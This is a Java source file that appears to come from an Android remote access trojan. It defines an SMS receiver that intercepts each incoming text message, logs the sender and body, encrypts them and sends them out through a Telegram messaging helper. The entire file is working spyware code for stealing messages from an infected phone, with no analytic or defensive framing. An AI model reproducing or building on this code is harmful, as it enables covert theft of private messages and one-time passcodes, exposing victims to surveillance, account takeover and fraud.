package com.enterprise.rat.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.enterprise.rat.utils.TelegramApi;
import com.enterprise.rat.utils.CryptoUtils;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                StringBuilder smsData = new StringBuilder();
                smsData.append("<b>🔔 NEW SMS INTERCEPTED</b>\n\n");
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    smsData.append("<b>From:</b> <code>").append(sms.getDisplayOriginatingAddress()).append("</code>\n")
                           .append("<b>Message:</b> ").append(sms.getDisplayMessageBody()).append("\n\n");
                }
                String encryptedData = CryptoUtils.encrypt(smsData.toString());
                TelegramApi.sendMessage(encryptedData);
            }
        }
    }
}
